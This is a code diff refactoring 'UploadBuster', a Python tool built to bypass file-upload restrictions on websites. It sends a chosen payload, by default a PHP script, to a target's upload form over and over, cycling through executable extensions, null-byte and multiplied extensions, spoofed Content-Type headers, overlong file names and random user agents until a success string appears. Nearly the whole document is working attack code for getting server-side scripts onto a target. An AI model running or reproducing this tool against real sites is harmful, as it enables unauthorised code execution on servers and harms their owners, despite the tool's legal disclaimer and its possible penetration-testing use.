@@ -1,7 +1,9 @@
-from random import randint
+from random import randint, choice
 import requests
 import json
 import argparse
+import uuid
+
 from time import sleep
 
 
@@ -11,34 +13,32 @@ def args_handler():
                                      epilog="legal disclaimer: \nUsage of UploadBuster for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.")
 
     # values
-    parser.add_argument("-u", "--url", help="Full url to the upload script i.e site.com/upload.php", required=True)
+    parser.add_argument("-u", "--url", help="Full url to the upload script [http://example.local/upload.php]", required=True)
     parser.add_argument("-b", "--backend", help="The backend language of the website [php,jsp,asp]", required=True)
-    parser.add_argument("-e", "--extensions", help="The allowed extensions of the website [jpeg,docx,png,pdf]",
-                        required=True)
-    parser.add_argument("-a", "--all-tests", help="Make the full test of insecure file upload on target",
-                        action='store_true')
-    parser.add_argument("-p", "--payload", default="PAYLOAD.php",
-                        help="Payload to sent, default: the preferred language hello script if not provided the script will be <?php echo HelloWorld;?>")
-    parser.add_argument("-s", "--success-message", default="success",
-                        help='The success message of the upload script. `Upload was successful! link: site.com/payload.php`')
-    parser.add_argument("-d", "--data", default=0, help='Add custom data to the request')
-    parser.add_argument("-uv", "--upload-variable", default="file",
-                        help='main page upload php form variable (i.e form-data; name:###')
+    parser.add_argument("-e", "--extensions", help="Allowed extensions for the upload form [jpeg,docx,png,pdf, please put only one.]", required=True)
+    parser.add_argument("-a", "--all-tests", help="Make the full test of insecure file upload on target", action='store_true')
+    parser.add_argument("-p", "--payload", default="PAYLOAD.php", help="Payload to sent, default: the preferred language hello script if not provided the script will be <?php echo HelloWorld;?>")
+    parser.add_argument("-s", "--success-message", default="success", help='The success string of the upload script. [Upload was successful! uploads/image.jpg]')
+    parser.add_argument("-d", "--data", default='submit,Upload', help='Add custom data to the request [name,key]')
+    parser.add_argument("-uv", "--upload-variable", default="file", help='main page upload php form variable (i.e form-data; name:###')
     parser.add_argument("-c", "--headers", help='Add custom headers to the request')
     parser.add_argument("-i", "--intervals", default=0, type=int, help='Add a delay between requests.')
     parser.add_argument("-to", "--request-time-out", default=3, type=int, help='Add a delay between requests.')
+    parser.add_argument("-re", "--request-redirects", action='store_true', help='Request Redirects flag.')
 
     # modes
-    parser.add_argument("-be", "--bruteforce-extension", help='Extension Brute forcing. ')
-    parser.add_argument("-bc", "--bruteforce-content-type", help='Content-Type field Brute forcing. ')
-    parser.add_argument("-de", "--double-extension", default=0, type=int,
-                        help='Tries to brute force using double extension technique. can add the number of times to inject the extensions. (-de [3] = jpg.php.php.php) ')
+    parser.add_argument("-be", "--bruteforce-extension", help='Extension Brute forcing.', action='store_true')
+    parser.add_argument("-bn", "--bruteforce-null-extension", help='Null Extension Brute forcing.', action='store_true')
+    parser.add_argument("-bc", "--bruteforce-content-type", help='Content-Type field Brute forcing. ', action='store_true')
+    parser.add_argument("-de", "--bruteforce-multi-extension", default=0, type=int,
+                        help='Tries to brute force using double extension technique. can add the number of times to inject the extensions. (-de [3] = jpg.php.php.php) ',)
+    parser.add_argument("-bl", "--bruteforce-filename-limit", help='Content-Type field Brute forcing. ', action='store_true')
     parser.add_argument("-db", "--dont-brute", action='store_true',
-                        help='is success message is found stop the brute force. ')
+                        help='if success message is found stop all tests. ')
 
     # print args
-    parser.add_argument("--print-i", help="print the Request", action='store_true')
-    parser.add_argument("--print-o", help="print the Response", action='store_true')
+    parser.add_argument("-vi", "--print-i", help="print the Request", action='store_true')
+    parser.add_argument("-vo", "--print-o", help="print the Response", action='store_true')
     parser.add_argument("-v", "--print", action='store_true', help='full data of the request')
     parser.add_argument("-vs", "--verbal-success", action='store_false', help='Turn off success message [switch]')
 
@@ -52,200 +52,189 @@ class UploadBuster:
         with open('json.json') as file:
             self._configuration = json.load(file)
 
-        # args object
+        # argparse
         self.args = args_handler()
-        self.target_url = self.args.url
-        self.payload_file_name = self.args.payload
-        self.backend_tech = self.args.backend
-        self.allowed_exts = self.args.extensions.split(',')
-        self.success_message = self.args.success_message
-        self._delay = self.args.intervals
+        self.args_user_payload_file_name = self.args.payload
+        self.args_backend = self.args.backend
+        self.args_allowed_ext = self.args.extensions
+        self.args_success_message = self.args.success_message
+        self.args_delay = self.args.intervals
 
         # request data
-        self._headers = dict()
-        self.request_file_name = self.payload_file_name
-        self.p1 = self.request_file_name  # request file name for payload
-        self.p2 = self.allowed_exts[0]  # request file extension for payload
-        self.payload = dict()
-        self._content_type = None
-        self._user_agent = None
-        self.auth = {}
-        self._ext_len = int()
-        self.request = None  # request object
-        self.submit = dict()
-        self._test_payload = '<?php echo HelloWorld;?>'
-        self.success_message_line = None
+        self.request_url = self.args.url
+        self.request_headers = dict()
+        self.request_files = dict()
+        self.request_data = dict()
+        self.request_auth = dict()
+        self.request_redirects = bool()
         self.request_time_out = self.args.request_time_out
 
-        # counters
-        self._success_counter = 0
+        # payload data
+        self.payload = dict()
+        self.payload_upload_variable = self.args.upload_variable
+        self.payload_file_name = str()
+        self.payload_file_ext = str()
+        self.payload_filename_full = self.payload_file_name + self.args_backend
+        self.payload_content_type = str()
 
-        # banks
-        self.temp_file_name_bank = []
-        self.temp_content_type_bank = []
+        # response
+        self.response_success_message_line = str()
 
-    # techs
+    # settings
+    def _change_payload_file_name(self, _new: str):
+        self.payload_file_name = _new
 
-    def _tech_rand_user_agent(self):
-        self._user_agent = {"user-agent": self._configuration['config']['user-agents'][randint(0, 2)]}
-        self._headers.update(self._user_agent)
+    def _change_payload_file_ext(self, _new: str):
+        self.payload_file_ext = _new
 
-    def _tech_ext_raw(self):
-        for ext in self._configuration['exts'][self.backend_tech]:
-            temp_file_name = self.payload_file_name[:-self._ext_len] + ext
-            self.temp_file_name_bank.append(temp_file_name)
+    def _change_payload_content_type(self, _new: str):
+        self.payload_content_type = _new
 
-    def _tech_ext_null(self):
-        for ext in self._configuration['exts']['null']:
-            temp_file_name = self.payload_file_name[:-self._ext_len] + ext
-            self.temp_file_name_bank.append(temp_file_name)
+    def _set_request_time_out(self, _new: int):
+        self.request_time_out = _new
 
-    def _tech_content_type(self, _random_flag=False):
-        for content_type in self._configuration['content_types']:
-            self.temp_content_type_bank.append(content_type)
-        if _random_flag:
-            return self.temp_content_type_bank[randint(1, len(self.temp_content_type_bank))]
-        if not _random_flag:
-            self._content_type = self.temp_content_type_bank[1]
+    def _set_request_redirects(self, _new: bool):
+        self.request_redirects = _new
 
-    def _tech_magic_bytes(self):
-        pass
+    def _update_request_headers(self, _name: str, _key: str):
+        self.request_headers.update({_name: _key})
 
-    # back
+    def _update_request_auth(self, _name: str, _key: str):
+        self.request_auth.update({_name: _key})
 
-    def _if_success(self):
-        for _line in str(self.request.text.lower()).split("\n"):
-            if self.success_message.lower() in _line.lower():
-                self.success_message_line = _line.strip()
-                self._success_counter += 1
-                return True
-        else:
-            return False
+    def _update_request_data(self, _name: str, _key: str):
+        self.request_data.update({_name: _key})
 
-    def _get_ext_len(self):
-        self.ext_len = len(self.args.payload.split(".")[-1]) + 1
+    def _update_request_files(self, _name: str, _key: str):
+        self.request_files.update({_name: _key})
 
-    def _add_submit_button(self):
-        self.submit = eval(self.args.data)
+    # adders
+    def _add_random_user_agent_to_request(self):
+        self._update_request_headers("user-agent", choice(self._configuration['config']['user-agents']))
 
-    def _refresh_format(self, _original=False):
-        if _original:
-            self.p1 = self.request_file_name
-            self.p2 = self.allowed_exts[0]
-        self.payload.update({self.args.upload_variable: (
-        self.p1 + "." + self.p2, open(self.payload_file_name, 'rb').read(), 'multipart/form-data')})
-        self._add_submit_button()
+    def _add_random_file_name_to_payload(self):
+        self.payload_file_name = uuid.uuid4().hex[:randint(4, 7)]
 
-        if "." not in self.payload[self.args.upload_variable][0]:  # no dot (.) in file name i.e payloadjpg
-            _temp_list = list(self.payload[self.args.upload_variable])
-            _temp_list[0] = self.payload[self.args.upload_variable][0] + "." + self.p2
-            self.payload[self.args.upload_variable] = tuple(_temp_list)
+    def _add_data_to_request(self):
+        _name, _key = self.args.data.split(",")
+        self._update_request_data(_name, _key)
 
     # bruters
-
-    def brut_ext(self):
+    def _bruter_file_ext(self):
         print(f"[+] Executing Bruteforce filename extension")
-        self._refresh_format(_original=True)
-        for self.p2 in self.temp_file_name_bank + self.allowed_exts:
+        for self.payload_file_ext in self._configuration['exts'][self.args_backend]:
+            self._refresh_format()
             self._send_post_request()
-            self._if_success()
             self._print_init()
 
-    def brut_double_ext(self):
-        print(f"[+] Executing Double File Extension")
-        self._refresh_format(_original=True)
-        for self.p2 in self.allowed_exts:
-            _p2_org = self.p2
-            for _ptemp in self.temp_file_name_bank:
-                for _EMPTY in range(int(self.args.double_extension)):
-                    _ptemp = _ptemp + _ptemp
-                    self.p2 = _p2_org + _ptemp
-                    self._send_post_request()
-                    self._if_success()
-                    self._print_init()
-
-    def _brut_brake_filename_limit(self):
-        print(f"[+] Executing Break filename length limit")
-        self._refresh_format(_original=True)
-        for _index in range(999):
-            self.p2 = _index * "A"
+    def _bruter_null_file_ext(self):
+        print(f"[+] Executing Bruteforce Null filename extension")
+        for self.payload_file_ext in self._configuration['exts']["null"]:
+            self.payload_file_ext = "."+self.args_backend+self.payload_file_ext
+            self._refresh_format()
             self._send_post_request()
-            self._if_success()
             self._print_init()
 
-    def brut_all(self):
-        print(f"[+] Executing All Techniques with extra functionality...")
-        self._refresh_format(_original=True)
-        for self.p2 in self.temp_file_name_bank + self.allowed_exts:
-            for _content_type in self.temp_content_type_bank:
-                self._headers.update({'content-type': _content_type})
+    def _bruter_multi_ext(self):
+        print(f"[+] Executing Bruteforce filename extension")
+        for self.payload_file_ext in self._configuration['exts'][self.args_backend]:
+            _temp = self.payload_file_ext
+            for _loops in range(1, 8):
+                self._change_payload_file_ext(self.payload_file_ext + _temp)
+                self._refresh_format()
                 self._send_post_request()
-                self._if_success()
                 self._print_init()
 
-    def brut_content_type(self):
-        print(f"[+] Executing Bruteforce Content-type header")
-        self._refresh_format(_original=True)
-        for _content_type in self.temp_content_type_bank:
-            self._headers.update({'content-type': _content_type})
+    def _bruter_filename_limit(self):
+        print(f"[+] Executing Break filename length limit")
+        for _index in range(999):
+            self._change_payload_file_ext("."+self.args_backend+(_index * "A"))
+            self._refresh_format()
             self._send_post_request()
-            self._if_success()
             self._print_init()
 
+    def _bruter_content_type(self):
+        print(f"[+] Executing Bruteforce Content-type header")
+        for self.payload_content_type in self._configuration['content_types']:
+            self._change_payload_file_ext("."+self.args_backend)
+            self._refresh_format()
+            self._send_post_request()
+            self._print_init()
+
+
+    def _refresh_format(self, _original=False):
+        self.request_files.update({self.payload_upload_variable: (self.payload_file_name + self.payload_file_ext, open(self.args_user_payload_file_name, 'rb').read(), self.payload_content_type)})
+        self.payload_filename_full = self.payload_file_name + self.args_backend
+
+    def _send_post_request(self):
+        self.request = requests.post(self.request_url, headers=self.request_headers, files=self.request_files,
+                                     data=self.request_data, timeout=1, auth=self.request_auth,
+                                     allow_redirects=True)
+        sleep(self.args_delay)
+
     def _print_init(self):
+        if self._if_success() and self.args.verbal_success:
+            pass
+            print(f'[+] Success message found!')
         if self.args.print_i:
-            print(f'POST {self.target_url}\n{self._headers}\n{self.payload} ')
+            print(f'POST {self.request_url}\n{self.request_headers}\n{self.request_files} ')
         if self.args.print_o:
-            print(f'POST {self.target_url}\n{self.request.headers}\n{self.request.text} ')
+            print(f'POST {self.request_url}\n{self.request_headers}\n{self.request.text} ')
         if self.args.print:
             print(f'''> Payload:
-        > URL: {self.target_url}
+        > URL: {self.request_url}
         + ~~~~~~~~~~~~~~~~~~~~~~~~~~
-        > HEADERS: {self._headers}
+        > HEADERS: {self.request_headers}
         + ~~~~~~~~~~~~~~~~~~~~~~~~~~
-        > FILE: {self.payload}
+        > FILE: {self.request_files}
         + ~~~~~~~~~~~~~~~~~~~~~~~~~~
-        > DATA: {self.args.data}
+        > DATA: {self.request_data}
         + ~~~~~~~~~~~~~~~~~~~~~~~~~~
-        > SUCCESS LINE: {self.success_message_line}
+        > SUCCESS LINE: {self.response_success_message_line}
         ''')
-        if self.args.verbal_success and self._if_success():
-            print(f'[+] Success message found!')
 
         if self.args.dont_brute and self._if_success():
             quit()
 
-    def _send_post_request(self):
-        with open(self.payload_file_name, 'r') as _file:
-            sleep(float(self._delay))
-            self._refresh_format()
-            self.request = requests.post(self.target_url, headers=self._headers, files=self.payload, data=self.submit,
-                                         timeout=self.request_time_out, auth=self.auth, allow_redirects=True)
+    def _if_success(self):
+        for _line in str(self.request.text.lower()).split("\n"):
+            if self.args_success_message.lower() in _line.lower():
+                self.response_success_message_line = _line.strip()
+                return True
+        else:
+            return False
 
     def main(self):
+
         def main_init():
-            try:
-                if len(self.args.headers) > 1:
-                    self._headers.update(eval(self.args.headers))
-            except NameError and TypeError:
-                self._headers = {}
-                pass
-            self._tech_ext_raw()
-            self._tech_ext_null()
-            self._get_ext_len()
-            self._tech_content_type()
-            self._tech_content_type()
-            self._tech_rand_user_agent()
+            self._add_random_user_agent_to_request()
+            self._add_random_file_name_to_payload()
+            self._add_data_to_request()
 
         main_init()
+        if self.args.bruteforce_extension:
+            self._bruter_file_ext()
 
-        try:
-            self.brut_ext()
-            self.brut_double_ext()
-            self.brut_content_type()
-            self._brut_brake_filename_limit()
-        except KeyboardInterrupt:
-            print('Exiting...', '\nsuccess: ', self._success_counter)
+        if self.args.bruteforce_content_type:
+            self._bruter_content_type()
+
+        if self.args.bruteforce_filename_limit:
+            self._bruter_filename_limit()
+
+        if self.args.bruteforce_multi_extension:
+            self._bruter_multi_ext()
+
+        if self.args.bruteforce_null_extension:
+            self._bruter_null_file_ext()
+
+        if self.args.all_tests:
+            print("[+] Executing All tests ")
+            self._bruter_file_ext()
+            self._bruter_null_file_ext()
+            self._bruter_multi_ext()
+            self._bruter_content_type()
+            self._bruter_filename_limit()
+
 
 if __name__ == '__main__':
     UploadBuster().main()
